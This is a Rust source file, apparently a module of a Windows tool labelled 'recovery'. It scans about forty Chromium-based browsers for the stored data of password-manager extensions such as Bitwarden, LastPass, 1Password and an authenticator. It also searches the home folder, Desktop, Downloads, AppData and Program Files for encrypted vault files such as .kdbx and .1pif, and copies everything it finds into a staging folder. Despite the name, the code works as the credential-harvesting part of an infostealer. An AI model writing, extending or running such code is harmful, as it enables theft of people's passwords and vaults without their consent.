use crate::recovery::{
    context::RecoveryContext,
    fs::{copy_dir_limited, sanitize_label},
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::ffi::OsStr;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::{fs, task};
use walkdir::WalkDir;

pub fn other_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(BrowserPasswordManagerTask::new(ctx)),
        Arc::new(PasswordManagerTask),
    ]
}

struct BrowserPasswordManagerTask {
    browsers: Vec<(String, PathBuf)>,
}

impl BrowserPasswordManagerTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let base = ctx.local_data_dir.clone();
        let browsers = CHROMIUM_BROWSER_DIRS
            .iter()
            .map(|(name, dir)| (name.to_string(), base.join(dir)))
            .collect();
        Self { browsers }
    }
}

#[async_trait]
impl RecoveryTask for BrowserPasswordManagerTask {
    fn label(&self) -> String {
        "Browser Password Managers".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Other
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        for (browser_name, root) in &self.browsers {
            let extension_root = root.join("Local Extension Settings");
            if !extension_root.exists() {
                continue;
            }

            for (key, manager_name) in PASSWORD_MANAGER_DIRECTORIES {
                let extension_path = extension_root.join(key);
                if !extension_path.exists() {
                    continue;
                }

                if !directory_has_entries(&extension_path).await {
                    continue;
                }

                let label = format!("{manager_name} ({browser_name})");
                let dest = password_manager_browser_dir(ctx, &label).await?;
                copy_dir_limited(
                    &extension_path,
                    &dest,
                    &label,
                    &mut artifacts,
                    usize::MAX,
                    0,
                )
                .await?;

                let location_file = dest.join("Location.txt");
                let location_text = extension_path.display().to_string();
                fs::write(&location_file, location_text).await?;
                let meta = fs::metadata(&location_file).await?;
                artifacts.push(RecoveryArtifact {
                    label: label.clone(),
                    path: location_file,
                    size_bytes: meta.len(),
                    modified: meta.modified().ok(),
                });
            }
        }

        Ok(artifacts)
    }
}

const PASSWORD_MANAGER_DIRECTORIES: &[(&str, &str)] = &[
    ("bitwarden", "bitwarden"),
    ("dashlane", "dashlane"),
    ("1password", "onepassword"),
    ("lastpass", "lastpass"),
    ("keeper", "keeper"),
    ("authenticator", "authenticator"),
    ("nordpass", "nordpass"),
    ("roboform", "roboform"),
    ("multipassword", "multipassword"),
    ("keepassxc", "keepassxc"),
];

const CHROMIUM_BROWSER_DIRS: &[(&str, &str)] = &[
    ("Chromium", r#"Chromium\User Data"#),
    ("GoogleChrome", r#"Google\Chrome\User Data"#),
    ("GoogleChromeSxS", r#"Google\Chrome SxS\User Data"#),
    ("GoogleChromeBeta", r#"Google\Chrome Beta\User Data"#),
    ("GoogleChromeDev", r#"Google\Chrome Dev\User Data"#),
    (
        "GoogleChromeUnstable",
        r#"Google\Chrome Unstable\User Data"#,
    ),
    ("GoogleChromeCanary", r#"Google\Chrome Canary\User Data"#),
    ("Edge", r#"Microsoft\Edge\User Data"#),
    ("Brave", r#"BraveSoftware\Brave-Browser\User Data"#),
    ("OperaGX", r#"Opera Software\Opera GX Stable"#),
    ("Opera", r#"Opera Software\Opera Stable"#),
    ("OperaNeon", r#"Opera Software\Opera Neon\User Data"#),
    ("Vivaldi", r#"Vivaldi\User Data"#),
    ("Blisk", r#"Blisk\User Data"#),
    ("Epic", r#"Epic Privacy Browser\User Data"#),
    ("SRWareIron", r#"SRWare Iron\User Data"#),
    ("ComodoDragon", r#"Comodo\Dragon\User Data"#),
    ("Yandex", r#"Yandex\YandexBrowser\User Data"#),
    ("YandexCanary", r#"Yandex\YandexBrowserCanary\User Data"#),
    (
        "YandexDeveloper",
        r#"Yandex\YandexBrowserDeveloper\User Data"#,
    ),
    ("YandexBeta", r#"Yandex\YandexBrowserBeta\User Data"#),
    ("YandexTech", r#"Yandex\YandexBrowserTech\User Data"#),
    ("YandexSxS", r#"Yandex\YandexBrowserSxS\User Data"#),
    ("Slimjet", r#"Slimjet\User Data"#),
    ("UC", r#"UCBrowser\User Data"#),
    ("Avast", r#"AVAST Software\Browser\User Data"#),
    ("CentBrowser", r#"CentBrowser\User Data"#),
    ("Kinza", r#"Kinza\User Data"#),
    ("Chedot", r#"Chedot\User Data"#),
    ("360Browser", r#"360Browser\User Data"#),
    ("Falkon", r#"Falkon\User Data"#),
    ("AVG", r#"AVG\Browser\User Data"#),
    ("CocCoc", r#"CocCoc\Browser\User Data"#),
    ("Torch", r#"Torch\User Data"#),
    ("NaverWhale", r#"Naver\Whale\User Data"#),
    ("Maxthon", r#"Maxthon\User Data"#),
    ("Iridium", r#"Iridium\User Data"#),
    ("Puffin", r#"CloudMosa\Puffin\User Data"#),
    ("Kometa", r#"Kometa\User Data"#),
    ("Amigo", r#"Amigo\User Data"#),
];

async fn directory_has_entries(path: &Path) -> bool {
    match fs::read_dir(path).await {
        Ok(mut dir) => dir.next_entry().await.unwrap_or(None).is_some(),
        Err(_) => false,
    }
}

async fn password_manager_browser_dir(
    ctx: &RecoveryContext,
    label: &str,
) -> Result<PathBuf, RecoveryError> {
    let folder = ctx
        .output_dir
        .join("services")
        .join("Other")
        .join("Password Managers")
        .join(sanitize_label(label));
    fs::create_dir_all(&folder).await?;
    Ok(folder)
}

struct PasswordManagerTask;

impl PasswordManagerTask {
    fn output_dir(ctx: &RecoveryContext) -> Result<PathBuf, RecoveryError> {
        let folder = ctx
            .output_dir
            .join("services")
            .join("Other")
            .join("Password Managers")
            .join("Password Manager Files");
        Ok(folder)
    }
}

const PASSWORD_MANAGER_EXTENSIONS: &[&str] = &[
    ".kdbx", ".keyx", ".1pif", ".psafe3", ".enpass", ".rbt", ".vault", ".db", ".sqlite", ".pwmgr",
    ".pwdb",
];

const EXCLUDED_FILE_NAMES: &[&str] = &[
    "settings",
    "configuration",
    "config",
    "cache",
    "temp",
    "wrapper",
    "internet",
    "framework",
    "manifest",
    "accessibility",
    "package-lock",
    "windows",
    "log",
];

const MIN_FILE_SIZE_BYTES: u64 = 128;
const MAX_FILE_SIZE_BYTES: u64 = 10 * 1024 * 1024;

#[async_trait]
impl RecoveryTask for PasswordManagerTask {
    fn label(&self) -> String {
        "Password Managers".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Other
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let search_dirs = gather_password_directories(ctx);
        let files = task::spawn_blocking(move || collect_password_files(search_dirs)).await?;

        if files.is_empty() {
            return Ok(Vec::new());
        }

        let dest_root = PasswordManagerTask::output_dir(ctx)?;
        fs::create_dir_all(&dest_root).await?;

        let mut artifacts = Vec::new();
        for file in files {
            let artifact =
                copy_password_manager_file(&file, &dest_root, "Password Managers").await?;
            artifacts.push(artifact);
        }

        Ok(artifacts)
    }
}

fn gather_password_directories(ctx: &RecoveryContext) -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    let _ = dirs.push(ctx.local_data_dir.clone());
    let _ = dirs.push(ctx.roaming_data_dir.clone());
    let _ = dirs.push(ctx.roaming_data_dir.join("Low"));
    let _ = dirs.push(ctx.home_dir.clone());

    dirs.push(ctx.home_dir.join("Desktop"));
    dirs.push(ctx.home_dir.join("Downloads"));
    dirs.push(ctx.home_dir.join("Documents"));

    for key in &["PROGRAMDATA", "ProgramFiles", "ProgramFiles(x86)"] {
        if let Ok(value) = std::env::var(key) {
            dirs.push(PathBuf::from(value));
        }
    }

    dirs.into_iter()
        .filter(|path| !path.as_os_str().is_empty())
        .collect::<Vec<_>>()
}

fn collect_password_files(paths: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut seen = std::collections::HashSet::new();
    let mut files = Vec::new();

    for path in paths.into_iter().filter(|p| p.is_dir()) {
        for entry in WalkDir::new(&path).into_iter().filter_map(Result::ok) {
            if !entry.file_type().is_file() {
                continue;
            }
            let candidate = entry.path().to_path_buf();
            if seen.contains(&candidate) {
                continue;
            }
            if is_password_manager_file(&candidate) {
                seen.insert(candidate.clone());
                files.push(candidate);
            }
        }
    }

    files
}

fn is_password_manager_file(path: &Path) -> bool {
    if !matches_extension(path, PASSWORD_MANAGER_EXTENSIONS) {
        return false;
    }

    if matches_excluded_name(path, EXCLUDED_FILE_NAMES) {
        return false;
    }

    let metadata = match std::fs::metadata(path) {
        Ok(metadata) => metadata,
        Err(_) => return false,
    };

    if metadata.len() < MIN_FILE_SIZE_BYTES || metadata.len() > MAX_FILE_SIZE_BYTES {
        return false;
    }

    is_encrypted(path).unwrap_or(false)
}

fn matches_extension(path: &Path, extensions: &[&str]) -> bool {
    path.extension()
        .and_then(OsStr::to_str)
        .map(|ext| {
            extensions
                .iter()
                .any(|allowed| ext.eq_ignore_ascii_case(allowed.trim_start_matches('.')))
        })
        .unwrap_or(false)
}

fn matches_excluded_name(path: &Path, excluded: &[&str]) -> bool {
    let name = path
        .file_stem()
        .and_then(OsStr::to_str)
        .unwrap_or("")
        .to_lowercase();
    excluded.iter().any(|ex| name.eq_ignore_ascii_case(ex))
}

fn is_encrypted(path: &Path) -> Option<bool> {
    let mut file = std::fs::File::open(path).ok()?;
    let mut buffer = [0u8; 1024];
    let read = file.read(&mut buffer).ok()?;
    if read == 0 {
        return Some(false);
    }
    let non_printable = buffer[..read]
        .iter()
        .copied()
        .filter(|b| *b < 32 || *b > 126)
        .count();
    Some((non_printable as f64) / (read as f64) > 0.8)
}

async fn copy_password_manager_file(
    source: &Path,
    dest_root: &Path,
    label: &str,
) -> Result<RecoveryArtifact, RecoveryError> {
    let file_name = source
        .file_name()
        .unwrap_or_else(|| OsStr::new("file"))
        .to_string_lossy()
        .to_string();
    let dest = resolve_unique_destination(dest_root, &file_name).await?;
    fs::copy(source, &dest).await?;
    let meta = fs::metadata(&dest).await?;
    Ok(RecoveryArtifact {
        label: label.to_string(),
        path: dest,
        size_bytes: meta.len(),
        modified: meta.modified().ok(),
    })
}

async fn resolve_unique_destination(
    dest_root: &Path,
    file_name: &str,
) -> Result<PathBuf, RecoveryError> {
    let mut candidate = dest_root.join(file_name);
    let mut counter = 0;
    let stem = Path::new(file_name)
        .file_stem()
        .and_then(OsStr::to_str)
        .unwrap_or(file_name);
    let extension = Path::new(file_name)
        .extension()
        .and_then(OsStr::to_str)
        .map(|ext| format!(".{ext}"))
        .unwrap_or_default();

    while fs::metadata(&candidate).await.is_ok() {
        counter += 1;
        let suffix = format!("{stem}_{counter}{extension}");
        candidate = dest_root.join(suffix);
    }

    Ok(candidate)
}
